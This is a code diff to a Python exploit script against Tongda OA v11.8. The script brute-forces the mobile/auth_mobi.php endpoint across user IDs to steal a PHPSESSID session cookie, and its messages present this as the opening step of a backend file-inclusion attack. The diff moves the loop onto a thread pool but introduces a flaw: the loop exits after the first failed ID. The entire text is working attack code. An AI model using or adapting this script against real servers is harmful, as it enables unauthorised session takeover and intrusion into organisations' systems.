@@ -6,6 +6,8 @@ import requests
 import multiprocessing
 import urllib3
 from rich.console import Console
+import threading
+from concurrent.futures import ThreadPoolExecutor
 
 console = Console()
 proxies={'http':'http://127.0.0.1:8080'}
@@ -17,19 +19,16 @@ headers = {
     'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
 }
  
-def Target_URL(target_url):
+def Target_URL(target_url,i):
     url = target_url + 'mobile/auth_mobi.php?isAvatar=1&uid={}&P_VER=0' 
     manage = target_url + "general/"
-    try:
-        for i in range(1,1000):
-            url = target_url + 'mobile/auth_mobi.php?isAvatar=1&uid={}&P_VER=0'.format(i)
-            response = requests.get(url=url, headers=headers, timeout=5, verify=False)
-            if response.status_code == 200 and response.text == "":
-                pattern = re.findall(r'PHPSESSID=(.*?);', str(response.headers))
-                cookie = "PHPSESSID={}".format(pattern[0])
-                return cookie
-    except:
-        console.print(now_time() + " [ERROR]    请求次数太多已超时, ", style='bold red')    
+    url = target_url + 'mobile/auth_mobi.php?isAvatar=1&uid={}&P_VER=0'.format(i)
+    response = requests.get(url=url, headers=headers, verify=False)
+    if response.status_code == 200 and response.text == "":
+        pattern = re.findall(r'PHPSESSID=(.*?);', str(response.headers))
+        cookie = "PHPSESSID={}".format(pattern[0])
+        return cookie
+
 
 
 
@@ -40,11 +39,18 @@ def main(target_url):
         target_url = 'http://' + target_url
     if target_url[-1]!='/':
         target_url += '/' 
+    Cookie=''
     console.print(now_time() + " [INFO]     正在检测通达OA v11.8 后台文件包含xxs", style='bold blue')
     console.print(now_time() + " [INFO]     正在尝试获取Cookie", style='bold blue')
-    Cookie = Target_URL(target_url)
-    if Cookie == None:
-        console.print(now_time() + ' [WARNING]  通达OA v11.8 后台文件包含漏洞利用失败，未能获取Cookie', style='bold red ')
+    for i in range(1, 1000):
+        pool = ThreadPoolExecutor(max_workers=60)
+        future1 = pool.submit(Target_URL, target_url,i)
+        if future1.result() != None:
+            Cookie=future1.result()
+            break
+        else:
+            console.print(now_time() + ' [WARNING]  通达OA v11.8 后台文件包含漏洞利用失败，未能获取Cookie', style='bold red ')
+            exit()
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
